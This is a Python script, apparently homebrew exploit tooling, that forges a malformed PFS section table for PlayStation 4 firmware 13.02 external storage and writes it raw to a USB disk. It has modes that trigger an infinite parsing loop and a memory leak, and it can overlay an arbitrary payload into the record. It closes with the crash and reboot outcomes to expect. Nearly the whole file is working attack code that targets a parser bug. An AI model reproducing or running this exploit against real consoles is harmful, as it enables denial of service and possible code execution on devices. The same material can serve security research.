#!/usr/bin/env python3
"""
fahrenheit.py — PFS section-table forger (PS4 13.02)

Corrected entry layout (from pfs_mount decompile, FUN_00ea1480):

    +0x00  u32 id          -- nonzero keeps the loop in the body
    +0x04  u32 flags
    +0x08  u32 name_len    -- length arg to FUN_00bc6380 (strncmp)
    +0x0C  u32 stride      -- walker advance; 0 = infinite loop (bug A)
    +0x10  u8  name[...]

Walker:
    piVar3  = (u8*)piVar38 + piVar38[3] + 0x14;
    piVar38 = (u8*)piVar38 + piVar38[3];
    while (piVar3 < end);

If piVar38[3] == 0 and *piVar38 != 0, neither pointer advances.

Modes:
    loop     -- stride=0, id!=0, name="blk_bitmap", name_len=len+1
    leak     -- stride=0, id!=0, name_len=0 (strncmp len 0 always matches,
                blk_bitmap branch fires every iteration, leaks 0x200+0x80000
                per cycle)
    payload  -- overlay only, no table
    all      -- loop entry + payload overlay

Reads block 0 of the partition (disk byte = partition_lba * 512). The
default --table-off assumes a partition at LBA 2048 (= 0x100000 disk byte).
Override with --table-off to match the actual partition start of your drive.

Requires jm_real.bin as skeleton. Refuses to write without --force.

Usage:
    python fahrenheit.py --scan --disk 1                     # locate table
    python fahrenheit.py --mode loop --table-off 0x100000 --no-write
    python fahrenheit.py --mode loop --table-off 0x100000 --disk 1 --force
    python fahrenheit.py --mode leak --table-off 0x100000 --disk 1 --force
    python fahrenheit.py --mode all --payload payload.bin --table-off 0x100000 --disk 1 --force
"""

import os, sys, json, struct, platform, subprocess, argparse
from pathlib import Path
from typing import Optional

# --------------------------------------------------------------- constants
LABEL       = b"PS4 External Storage Metadata R\x00"
LABEL_OFF   = 0x6000
SECTOR      = 512
ENTRY_SIZE  = 0x38                       # fixed-size guess; --stride overrides
DEFAULT_TABLE_OFF = 0x100000             # partition at LBA 2048
DEFAULT_BODY_OFF  = 0x6040               # payload landing zone in record

IS_WIN = platform.system() == "Windows"
IS_LIN = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"
HERE   = Path(__file__).resolve().parent


# =============================================================== raw I/O
if IS_WIN:
    import ctypes
    from ctypes import wintypes
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)

    _k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    _k32.CreateFileW.restype  = wintypes.HANDLE

    _k32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong,
        ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
    _k32.SetFilePointerEx.restype  = wintypes.BOOL

    _k32.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.ReadFile.restype  = wintypes.BOOL

    _k32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.WriteFile.restype  = wintypes.BOOL

    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype  = wintypes.BOOL

    _GR, _GW = 0x80000000, 0x40000000
    _OPEN_EXISTING, _SHARE_RW = 3, 3
    _INVALID = (1 << (8 * ctypes.sizeof(ctypes.c_void_p))) - 1

    def _open(path, write):
        h = _k32.CreateFileW(
            path,
            _GR | (_GW if write else 0),
            _SHARE_RW, None, _OPEN_EXISTING, 0, None)
        hv = getattr(h, "value", h) or 0
        if isinstance(hv, int) and hv < 0:
            hv += 1 << (8 * ctypes.sizeof(ctypes.c_void_p))
        if hv == 0 or hv == _INVALID:
            raise OSError(
                f"CreateFile {path}: Win32 {ctypes.get_last_error()} "
                f"(run elevated, close HxD and Disk Management)")
        return h

    def _seek(h, off):
        np = ctypes.c_longlong(0)
        if not _k32.SetFilePointerEx(h, ctypes.c_longlong(off),
                                     ctypes.byref(np), 0):
            raise OSError(f"seek {off:#x}: {ctypes.get_last_error()}")

    def _read(h, off, n):
        # Windows raw reads need sector-aligned offset and length.
        base = (off // SECTOR) * SECTOR
        delta = off - base
        want = n + delta
        if want % SECTOR:
            want = ((want + SECTOR - 1) // SECTOR) * SECTOR
        _seek(h, base)
        buf = ctypes.create_string_buffer(want)
        got = wintypes.DWORD(0)
        if not _k32.ReadFile(h, buf, want, ctypes.byref(got), None):
            raise OSError(f"read {base:#x}: {ctypes.get_last_error()}")
        if got.value != want:
            raise OSError(f"short read {base:#x}: {got.value}/{want}")
        return buf.raw[delta:delta + n]

    def _write(h, off, data):
        if off % SECTOR or len(data) % SECTOR:
            raise ValueError(f"unaligned write {off:#x}/{len(data)}")
        _seek(h, off)
        buf = ctypes.create_string_buffer(data, len(data))
        got = wintypes.DWORD(0)
        if not _k32.WriteFile(h, buf, len(data), ctypes.byref(got), None):
            raise OSError(f"write {off:#x}: {ctypes.get_last_error()}")
        if got.value != len(data):
            raise OSError(f"short write {got.value}/{len(data)}")

    def _close(h):
        _k32.CloseHandle(h)

    def devpath(n):
        return rf"\\.\PhysicalDrive{n}"

    def list_disks():
        ps = ("Get-CimInstance Win32_DiskDrive | Select-Object "
              "Index,Model,Size,InterfaceType,MediaType | "
              "ConvertTo-Json -Compress -Depth 3")
        try:
            out = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps],
                capture_output=True, text=True, timeout=15).stdout
            d = json.loads(out.strip() or "[]")
            if isinstance(d, dict):
                d = [d]
            return [{
                "index": int(x.get("Index", -1)),
                "model": str(x.get("Model", "")),
                "size":  int(x.get("Size", 0) or 0),
                "iface": str(x.get("InterfaceType", "") or ""),
                "media": str(x.get("MediaType", "") or ""),
            } for x in d]
        except Exception:
            return []

    def dismount(n):
        ps = (
            f"$ErrorActionPreference='SilentlyContinue';"
            f"Get-Partition -DiskNumber {n} | "
            f"Where-Object {{$_.DriveLetter}} | ForEach-Object {{ "
            f"Remove-PartitionAccessPath -DiskNumber {n} "
            f"-PartitionNumber $_.PartitionNumber "
            f"-AccessPath ($_.DriveLetter + ':') }}")
        subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                       capture_output=True, timeout=15)

    def is_system_disk(n):
        ps = (f"$d = Get-Disk -Number {n} -ErrorAction SilentlyContinue; "
              f"if ($d -and ($d.IsSystem -or $d.IsBoot)) {{'1'}} else {{'0'}}")
        try:
            out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                                 capture_output=True, text=True, timeout=10).stdout
            return out.strip() == "1"
        except Exception:
            return True

else:
    def _open(path, write):
        try:
            return os.open(path, os.O_RDWR if write else os.O_RDONLY)
        except PermissionError:
            raise OSError(f"open {path}: permission denied (run as root)")

    def _seek(fd, off):
        os.lseek(fd, off, os.SEEK_SET)

    def _read(fd, off, n):
        _seek(fd, off)
        d = b""
        while len(d) < n:
            c = os.read(fd, n - len(d))
            if not c:
                break
            d += c
        if len(d) != n:
            raise OSError(f"short read {off:#x}: {len(d)}/{n}")
        return d

    def _write(fd, off, data):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write ({len(data)})")
        _seek(fd, off)
        w = 0
        while w < len(data):
            w += os.write(fd, data[w:])
        if w != len(data):
            raise OSError(f"short write {w}/{len(data)}")

    def _close(fd):
        try:
            os.close(fd)
        except Exception:
            pass

    def devpath(n):
        return f"/dev/sd{chr(ord('a')+n)}"

    def list_disks():
        out = []
        if not IS_LIN:
            return out
        try:
            r = subprocess.run(
                ["lsblk", "-J", "-b", "-o",
                 "NAME,TYPE,SIZE,MODEL,RM,TRAN"],
                capture_output=True, text=True, timeout=10).stdout
            for d in json.loads(r).get("blockdevices", []):
                if d.get("type") != "disk":
                    continue
                out.append({
                    "index": len(out),
                    "model": (d.get("model") or "").strip(),
                    "size":  int(d.get("size") or 0),
                    "iface": (d.get("tran") or "").upper(),
                    "media": "Removable" if str(d.get("rm")) == "1" else "Fixed",
                    "path":  f"/dev/{d['name']}",
                })
        except Exception:
            pass
        return out

    def dismount(n):
        pass

    def is_system_disk(n):
        return False


# =============================================================== helpers

def hexdump(data, base=0, width=16):
    out = []
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        h = " ".join(f"{b:02x}" for b in chunk)
        t = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"  {base+i:08x}  {h:<{width*3}}  {t}")
    return "\n".join(out)


def find_file(name, explicit=None):
    if explicit:
        p = Path(explicit)
        if p.exists():
            return p
        raise SystemExit(f"missing: {explicit}")
    for cand in [HERE / name, Path.cwd() / name]:
        if cand.exists():
            return cand
    return None


# =============================================================== entry build

def make_entry(eid, flags, name_len, stride, name=b"", entry_size=None):
    es = entry_size or ENTRY_SIZE
    e = bytearray(es)
    struct.pack_into("<I", e, 0x00, eid & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x04, flags & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x08, name_len & 0xFFFFFFFF)
    struct.pack_into("<I", e, 0x0C, stride & 0xFFFFFFFF)
    room = es - 0x10
    if room > 0:
        nb = name[:room]
        e[0x10:0x10+len(nb)] = nb
    return bytes(e)


def build_loop_entry(entry_size=None):
    """Bug A: stride=0, id!=0, name matches 'blk_bitmap'."""
    return make_entry(
        eid=2, flags=0,
        name_len=len(b"blk_bitmap") + 1,
        stride=0,
        name=b"blk_bitmap",
        entry_size=entry_size)


def build_leak_entry(entry_size=None):
    """Bug A + alloc leak: stride=0, name_len=0 (strncmp len 0 always matches)."""
    return make_entry(
        eid=2, flags=0,
        name_len=0, stride=0,
        name=b"",
        entry_size=entry_size)


# =============================================================== scan

def scan_for_section_table(disk_index, start=0x0, end=0x200000,
                           entry_size=None):
    """
    Read a window and look for patterns resembling a section table.

    Fixed-size assumption: consecutive entries at stride = entry_size.
    If the real entries use variable stride (name_len-dependent), the
    scan will miss them. In that case, search by string name.
    """
    es = entry_size or ENTRY_SIZE

    if is_system_disk(disk_index):
        raise SystemExit(f"refusing: disk {disk_index} hosts the system")
    path = devpath(disk_index)
    h = _open(path, False)
    try:
        window = end - start
        data = _read(h, start, window)
    finally:
        _close(h)

    hits = []
    for off in range(0, window - es * 2, 4):
        e0_id     = struct.unpack_from("<I", data, off + 0x00)[0]
        e0_flags  = struct.unpack_from("<I", data, off + 0x04)[0]
        e0_nameln = struct.unpack_from("<I", data, off + 0x08)[0]
        e0_stride = struct.unpack_from("<I", data, off + 0x0C)[0]
        if e0_id == 0:
            continue
        if not (0 < e0_nameln <= 0x40):
            continue
        if not (0x10 <= e0_stride <= 0x400):
            continue
        e1_off = off + e0_stride
        if e1_off + 0x10 > window:
            continue
        e1_id     = struct.unpack_from("<I", data, e1_off + 0x00)[0]
        e1_nameln = struct.unpack_from("<I", data, e1_off + 0x08)[0]
        e1_stride = struct.unpack_from("<I", data, e1_off + 0x0C)[0]
        if e1_id == 0 or not (0 < e1_nameln <= 0x40):
            continue
        if not (0x10 <= e1_stride <= 0x400):
            continue
        name0 = data[off + 0x10: off + 0x10 + min(e0_nameln, 0x20)]
        hits.append((start + off, e0_id, e0_nameln, e0_stride, name0))

    # Also scan for the literal string "blk_bitmap" -- names are inline in
    # the entry. This catches variable-stride tables.
    needle = b"blk_bitmap"
    i = 0
    while True:
        j = data.find(needle, i)
        if j < 0:
            break
        # Entry start should be needle_off - 0x10 if name is inline at +0x10
        candidate = j - 0x10
        if candidate >= 0:
            hits.append((start + candidate, -1, -1, -1, needle))
        i = j + 1

    if not hits:
        print(f"no candidate section-table patterns in "
              f"0x{start:X}..0x{end:X}")
        return
    print(f"{len(hits)} candidate offsets:")
    seen = set()
    for off, eid, nameln, stride, name in hits[:64]:
        if off in seen:
            continue
        seen.add(off)
        printable = "".join(chr(b) if 32 <= b < 127 else "." for b in name)
        if eid >= 0:
            print(f"  0x{off:08X}  id={eid:<6}  namelen={nameln:<4}  "
                  f"stride=0x{stride:X}  name={printable!r}")
        else:
            print(f"  0x{off:08X}  (string hit)  name={printable!r}")


# =============================================================== forge

def forge(base: bytes, mode: str, payload: bytes,
          table_off: int, body_off: int, entry_size=None):
    if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
        raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")

    size = max(len(base), body_off + len(payload), table_off + 0x400)
    size = (size + SECTOR - 1) // SECTOR * SECTOR
    img = bytearray(size)
    img[:len(base)] = base

    if mode == "loop":
        table = build_loop_entry(entry_size)
    elif mode == "leak":
        table = build_leak_entry(entry_size)
    elif mode == "payload":
        table = b""
    elif mode == "all":
        table = build_loop_entry(entry_size) + build_leak_entry(entry_size)
    else:
        raise SystemExit(f"unknown mode: {mode}")

    if table:
        end = min(len(img), table_off + len(table))
        img[table_off:end] = table[:end - table_off]

    if payload:
        end = min(len(img), body_off + len(payload))
        n = end - body_off
        if n > 0:
            img[body_off:end] = payload[:n]

    return bytes(img)


# =============================================================== write

def write_image(disk_index, img, table_off, entry_size=None):
    es = entry_size or ENTRY_SIZE
    if is_system_disk(disk_index):
        raise SystemExit(f"refusing: disk {disk_index} hosts the system")

    path = devpath(disk_index)
    print(f"target : {path}")
    print(f"image  : {len(img):,} bytes ({len(img)/1024/1024:.2f} MB)")
    print("dismounting...")
    dismount(disk_index)

    h = _open(path, True)
    try:
        saved = None
        try:
            saved = _read(h, 0, SECTOR)
            print(f"saved MBR sig {saved[510]:02x} {saved[511]:02x}")
        except OSError as e:
            print(f"WARN: MBR readback: {e}")

        chunk = 1 << 20
        w = 0
        total = len(img)
        while w < total:
            n = min(chunk, total - w)
            if n % SECTOR:
                n = ((n + SECTOR - 1) // SECTOR) * SECTOR
                if w + n > total:
                    n = total - w
            _write(h, w, img[w:w+n])
            w += n
            print(f"  {w*100//total:3d}%  {w:,}/{total:,}")

        if saved is not None:
            _write(h, 0, saved)
            print("MBR restored")
    finally:
        _close(h)

    print("verifying...")
    h = _open(path, False)
    try:
        lab = _read(h, LABEL_OFF, len(LABEL) + 4)
        ok_lab = lab.startswith(LABEL)
        tbl = _read(h, table_off, es)
        tbl_id  = struct.unpack_from("<I", tbl, 0x00)[0]
        tbl_str = struct.unpack_from("<I", tbl, 0x0C)[0]
        print(f"  label  {'OK' if ok_lab else 'MISSING'}")
        print(f"  table  id={tbl_id} stride=0x{tbl_str:X}")
        print(hexdump(tbl, base=table_off))
        return ok_lab and tbl_id != 0
    finally:
        _close(h)


# =============================================================== main

def main():
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--mode", choices=["loop", "leak", "payload", "all"],
                    default="loop")
    ap.add_argument("--payload", default=None)
    ap.add_argument("--base",    default=None)
    ap.add_argument("--disk",    type=int, default=None)
    ap.add_argument("--out",     default="merged_pfs.bin")
    ap.add_argument("--table-off", type=lambda x: int(x, 0),
                    default=DEFAULT_TABLE_OFF)
    ap.add_argument("--body-off",  type=lambda x: int(x, 0),
                    default=DEFAULT_BODY_OFF)
    ap.add_argument("--entry-size", type=lambda x: int(x, 0),
                    default=ENTRY_SIZE,
                    help="section entry size (default 0x38)")
    ap.add_argument("--scan", action="store_true",
                    help="scan for section-table-like patterns (read-only)")
    ap.add_argument("--scan-end", type=lambda x: int(x, 0),
                    default=0x200000)
    ap.add_argument("--no-write", action="store_true")
    ap.add_argument("--list", action="store_true")
    ap.add_argument("--force", action="store_true")
    args = ap.parse_args()

    if args.list:
        for d in list_disks():
            gb = d.get("size", 0) / (1024**3)
            print(f"[{d['index']:>2}]  {gb:8.2f} GB  "
                  f"{d.get('iface', ''):<6}  {d.get('media', ''):<12}  "
                  f"{d.get('path', devpath(d['index']))}  {d.get('model', '')}")
        return

    if args.scan:
        if args.disk is None:
            sys.exit("--scan requires --disk N")
        scan_for_section_table(args.disk, 0, args.scan_end,
                               entry_size=args.entry_size)
        return

    if not args.no_write and not args.force:
        sys.exit("refusing to write without --force")

    base_path = find_file("jm_real.bin", args.base)
    if base_path is None:
        sys.exit("jm_real.bin required (a real PS4-written record)")
    base = base_path.read_bytes()
    print(f"base    : {base_path} ({len(base):,} bytes)")

    payload = b""
    if args.mode in ("payload", "all"):
        p = find_file("payload.bin", args.payload)
        if p is None:
            print("payload.bin not found; continuing without payload")
        else:
            payload = p.read_bytes()
            print(f"payload : {p} ({len(payload):,} bytes)")

    img = forge(base, args.mode, payload,
                args.table_off, args.body_off,
                entry_size=args.entry_size)

    Path(args.out).write_bytes(img)
    print(f"merged  : {args.out} ({len(img):,} bytes)")
    print(f"table at 0x{args.table_off:X}  mode={args.mode}  "
          f"entry_size=0x{args.entry_size:X}")
    print(hexdump(img[args.table_off:args.table_off + 0x80],
                  base=args.table_off))

    if args.no_write:
        return

    disk = args.disk
    if disk is None:
        cand = [d for d in list_disks()
                if "USB" in d.get("iface", "").upper()
                or d.get("media", "").lower().startswith("remov")]
        if not cand:
            sys.exit("no removable disk; pass --disk N")
        disk = cand[0]["index"]
        print(f"auto-picked disk {disk}")

    write_image(disk, img, args.table_off, entry_size=args.entry_size)
    print()
    print("done. Eject. Insert. Tap 'Use This Extended Storage'.")
    print("Expected:")
    print("  LED solid, console hangs             -> bug A fired")
    print("  LED flashing, then reboot            -> bug A + watchdog")
    print("  Runs out of memory, reboots          -> leak mode")
    print("  Identical to baseline                -> table not at --table-off,")
    print("                                          or table is encrypted")


if __name__ == "__main__":
    main()